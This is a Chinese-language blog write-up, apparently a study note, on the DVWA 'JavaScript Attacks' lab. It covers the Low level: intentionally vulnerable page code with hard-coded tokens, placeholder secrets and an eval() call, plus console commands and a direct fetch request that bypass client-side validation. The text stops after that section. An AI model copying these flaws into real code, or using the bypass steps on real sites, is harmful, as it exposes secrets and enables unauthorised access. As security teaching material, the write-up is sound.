@@ -1,0 +1,875 @@
+<!DOCTYPE html>
+<html lang="en,zh-CN,default">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.1.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/fancybox/2.1.5/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/undefined/pace/pace-theme-pace-theme-center-atom.min.css">
+  <script src="/undefined/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"caixuya.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"hide","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":false,"nav":null},"algolia":{"appID":"B5HBQCBE1B","apiKey":"ea181e93e7b10c0d94c8e758b7eb25ab","indexName":"hexo","hits":{"per_page":10},"labels":{"input_placeholder":"输入关键字","hits_empty":"没有找到与「${query}」相关的内容","hits_stats":"${hits}条相关记录，共耗时 ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="目录 漏洞简介 Low 难度 Medium 难度 High 难度 Impossible 难度 防御建议   漏洞简介什么是JavaScript Attacks（JavaScript攻击）？JavaScript攻击是指通过客户端JavaScript代码的漏洞进行的攻击，包括客户端逻辑绕过、JavaScript代码分析、原型链污染、DOM破坏等。 JavaScript攻击的类型：  客户端验证绕过 -">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DVWA - JavaScript Attacks 攻防练习详解">
+<meta property="og:url" content="http://caixuya.github.io/2025/11/20/JavaScript_Attacks_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/index.html">
+<meta property="og:site_name" content="tia的学习笔记">
+<meta property="og:description" content="目录 漏洞简介 Low 难度 Medium 难度 High 难度 Impossible 难度 防御建议   漏洞简介什么是JavaScript Attacks（JavaScript攻击）？JavaScript攻击是指通过客户端JavaScript代码的漏洞进行的攻击，包括客户端逻辑绕过、JavaScript代码分析、原型链污染、DOM破坏等。 JavaScript攻击的类型：  客户端验证绕过 -">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-11-20T15:31:37.109Z">
+<meta property="article:modified_time" content="2025-11-20T15:27:28.074Z">
+<meta property="article:author" content="caixuya">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://caixuya.github.io/2025/11/20/JavaScript_Attacks_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>DVWA - JavaScript Attacks 攻防练习详解 | tia的学习笔记</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="tia的学习笔记" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">tia的学习笔记</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-主页">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>主页</a>
+
+  </li>
+        <li class="menu-item menu-item-分类">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-目录">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>目录</a>
+
+  </li>
+        <li class="menu-item menu-item-站点地图">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-关于我">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于我</a>
+
+  </li>
+        <li class="menu-item menu-item-开往">
+
+    <a href="/travelling/" rel="section"><i class="fa fa-paper-plane fa-fw"></i>开往</a>
+
+  </li>
+        <li class="menu-item menu-item-给我写信">
+
+    <a href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=vY_MiY2FhI2Ojf3MzJPe0tA" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>给我写信</a>
+
+  </li>
+        <li class="menu-item menu-item-公益404">
+
+    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益404</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container"></div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="algolia-results">
+  <div id="algolia-stats"></div>
+  <div id="algolia-hits"></div>
+  <div id="algolia-pagination" class="algolia-pagination"></div>
+</div>
+
+      
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://caixuya.github.io/2025/11/20/JavaScript_Attacks_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="caixuya">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="tia的学习笔记">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          DVWA - JavaScript Attacks 攻防练习详解
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2025-11-20 23:31:37 / Modified: 23:27:28" itemprop="dateCreated datePublished" datetime="2025-11-20T23:31:37+08:00">2025-11-20</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/dvwa%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">dvwa靶场学习笔记</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>21k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>19 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B">漏洞简介</a></li>
+<li><a href="#low-%E9%9A%BE%E5%BA%A6">Low 难度</a></li>
+<li><a href="#medium-%E9%9A%BE%E5%BA%A6">Medium 难度</a></li>
+<li><a href="#high-%E9%9A%BE%E5%BA%A6">High 难度</a></li>
+<li><a href="#impossible-%E9%9A%BE%E5%BA%A6">Impossible 难度</a></li>
+<li><a href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE">防御建议</a></li>
+</ul>
+<hr>
+<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><h3 id="什么是JavaScript-Attacks（JavaScript攻击）？"><a href="#什么是JavaScript-Attacks（JavaScript攻击）？" class="headerlink" title="什么是JavaScript Attacks（JavaScript攻击）？"></a>什么是JavaScript Attacks（JavaScript攻击）？</h3><p>JavaScript攻击是指通过客户端JavaScript代码的漏洞进行的攻击，包括客户端逻辑绕过、JavaScript代码分析、原型链污染、DOM破坏等。</p>
+<p><strong>JavaScript攻击的类型：</strong></p>
+<ol>
+<li><strong>客户端验证绕过</strong> - 修改或禁用JavaScript验证</li>
+<li><strong>逻辑漏洞利用</strong> - 利用JavaScript代码中的逻辑错误</li>
+<li><strong>代码混淆破解</strong> - 反混淆获取敏感信息</li>
+<li><strong>原型链污染</strong> - 污染Object.prototype</li>
+<li><strong>DOM Clobbering</strong> - 通过HTML元素ID&#x2F;name覆盖全局变量</li>
+<li><strong>JavaScript注入</strong> - 向JavaScript上下文注入恶意代码</li>
+<li><strong>WebAssembly攻击</strong> - 利用WASM的漏洞</li>
+</ol>
+<p><strong>危害：</strong></p>
+<ul>
+<li>绕过客户端安全检查</li>
+<li>获取隐藏的敏感信息</li>
+<li>修改程序逻辑</li>
+<li>执行未授权操作</li>
+<li>窃取令牌和密钥</li>
+</ul>
+<p><strong>DVWA场景：</strong><br>一个JavaScript验证的表单，用户需要通过token验证才能提交。</p>
+<p><strong>关键原则：</strong></p>
+<blockquote>
+<p>永远不要信任客户端！所有安全验证都应在服务器端进行。</p>
+</blockquote>
+<hr>
+<h2 id="Low-难度"><a href="#Low-难度" class="headerlink" title="Low 难度"></a>Low 难度</h2><h3 id="攻击目标"><a href="#攻击目标" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>客户端JavaScript包含明文token，可直接获取。</p>
+<h3 id="前端代码分析"><a href="#前端代码分析" class="headerlink" title="前端代码分析"></a>前端代码分析</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>JavaScript Attacks - Low<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>JavaScript Attack Test<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Submit the phrase &quot;success&quot; to win!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;submitForm&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;phrase&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phrase&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Enter phrase&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;result&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// ★★★ 核心漏洞：token硬编码在客户端 ★★★</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 任何人都可以查看源代码获取token</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 这是最严重的安全错误之一</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> token = <span class="string">&quot;success&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 表单提交处理</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;submitForm&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;submit&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        e.<span class="title function_">preventDefault</span>();</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 获取用户输入</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> phrase = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;phrase&#x27;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// ★★★ 危险操作：客户端验证 ★★★</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 问题：</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 1. token明文存储在JavaScript中</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 2. 验证完全在客户端进行</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 3. 攻击者可以直接查看token</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 4. 可以禁用JavaScript绕过验证</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (phrase === token) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 验证通过</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;result&#x27;</span>).<span class="property">innerHTML</span> =</span></span><br><span class="line"><span class="language-javascript">                <span class="string">&#x27;&lt;p style=&quot;color:green;&quot;&gt;✓ Correct! Well done!&lt;/p&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// ★★★ 问题：在客户端显示敏感信息 ★★★</span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 实际应用中可能是：</span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// - API密钥</span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// - 数据库凭证</span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// - 管理员令牌</span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// - 加密密钥</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Token validated: &#x27;</span> + token);</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Secret data: admin_password_123&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// 验证失败</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;result&#x27;</span>).<span class="property">innerHTML</span> =</span></span><br><span class="line"><span class="language-javascript">                <span class="string">&#x27;&lt;p style=&quot;color:red;&quot;&gt;✗ Invalid phrase&lt;/p&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// ★★★ 更危险的做法：在JavaScript中存储敏感数据 ★★★</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> config = &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">apiKey</span>: <span class="string">&#x27;sk-1234567890abcdef&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">apiSecret</span>: <span class="string">&#x27;secret_key_do_not_share&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">adminToken</span>: <span class="string">&#x27;admin_token_12345&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">databasePassword</span>: <span class="string">&#x27;db_pass_456&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// ★★★ 问题：使用eval()或Function()执行动态代码 ★★★</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 如果有输入可以影响这些，就会导致代码注入</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">executeCommand</span>(<span class="params">cmd</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 极度危险！</span></span></span><br><span class="line"><span class="language-javascript">        <span class="built_in">eval</span>(cmd);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// ★★★ 问题：敏感逻辑暴露 ★★★</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">isAdmin</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 这种检查毫无意义，因为攻击者可以直接调用grantAdminAccess()</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">grantAdminAccess</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Admin access granted!&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">&#x27;/admin/dashboard&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><strong>核心问题：</strong></p>
+<ol>
+<li><strong>明文token</strong> - 直接写在JavaScript中</li>
+<li><strong>客户端验证</strong> - 所有验证在浏览器进行</li>
+<li><strong>敏感信息泄露</strong> - API密钥、密码等存储在JS</li>
+<li><strong>可绕过的逻辑</strong> - 攻击者可以直接调用函数</li>
+<li><strong>使用eval()</strong> - 可能导致代码注入</li>
+</ol>
+<p><strong>数据流：</strong></p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用户输入 → <span class="keyword">JavaScript验证 </span>→ 客户端显示结果</span><br><span class="line"></span><br><span class="line">问题：服务器完全不参与验证！</span><br></pre></td></tr></table></figure>
+
+<h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><h4 id="步骤1：查看源代码获取token"><a href="#步骤1：查看源代码获取token" class="headerlink" title="步骤1：查看源代码获取token"></a>步骤1：查看源代码获取token</h4><p><strong>方法1：右键查看源代码</strong></p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. 右键点击页面</span><br><span class="line"><span class="number">2</span>. 选择<span class="string">&quot;查看源代码&quot;</span></span><br><span class="line"><span class="number">3</span>. 搜索<span class="string">&quot;token&quot;</span>或<span class="string">&quot;success&quot;</span></span><br><span class="line"><span class="number">4</span>. 找到：var token <span class="operator">=</span> <span class="string">&quot;success&quot;</span><span class="comment">;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>方法2：使用DevTools</strong></p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> 按F12打开开发者工具</span><br><span class="line"><span class="bullet">2.</span> 切换到&quot;Sources&quot;标签</span><br><span class="line"><span class="bullet">3.</span> 查看内联JavaScript</span><br><span class="line"><span class="bullet">4.</span> 找到token变量</span><br></pre></td></tr></table></figure>
+
+<p><strong>方法3：直接在Console查看</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在Console中输入</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(token);</span><br><span class="line"><span class="comment">// 输出：success</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤2：提取所有敏感信息"><a href="#步骤2：提取所有敏感信息" class="headerlink" title="步骤2：提取所有敏感信息"></a>步骤2：提取所有敏感信息</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在Console中执行</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(token);           <span class="comment">// success</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(config.<span class="property">apiKey</span>);   <span class="comment">// sk-1234567890abcdef</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(config.<span class="property">apiSecret</span>); <span class="comment">// secret_key_do_not_share</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(config.<span class="property">adminToken</span>); <span class="comment">// admin_token_12345</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤3：绕过验证直接调用函数"><a href="#步骤3：绕过验证直接调用函数" class="headerlink" title="步骤3：绕过验证直接调用函数"></a>步骤3：绕过验证直接调用函数</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 直接调用敏感函数</span></span><br><span class="line"><span class="title function_">grantAdminAccess</span>();</span><br><span class="line"><span class="comment">// 结果：直接跳转到admin页面</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 或修改DOM</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;result&#x27;</span>).<span class="property">innerHTML</span> =</span><br><span class="line">    <span class="string">&#x27;&lt;p style=&quot;color:green;&quot;&gt;✓ Hacked!&lt;/p&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤4：禁用JavaScript验证"><a href="#步骤4：禁用JavaScript验证" class="headerlink" title="步骤4：禁用JavaScript验证"></a>步骤4：禁用JavaScript验证</h4><p><strong>方法1：修改HTML</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在Console中</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;submitForm&#x27;</span>).<span class="property">onsubmit</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="comment">// 或</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;submitForm&#x27;</span>).<span class="title function_">removeEventListener</span>(<span class="string">&#x27;submit&#x27;</span>, ...);</span><br></pre></td></tr></table></figure>
+
+<p><strong>方法2：直接发送请求</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用fetch绕过前端验证</span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/submit&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="attr">headers</span>: &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;,</span><br><span class="line">    <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;<span class="attr">phrase</span>: <span class="string">&#x27;anything&#x27;</span>&#125;)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
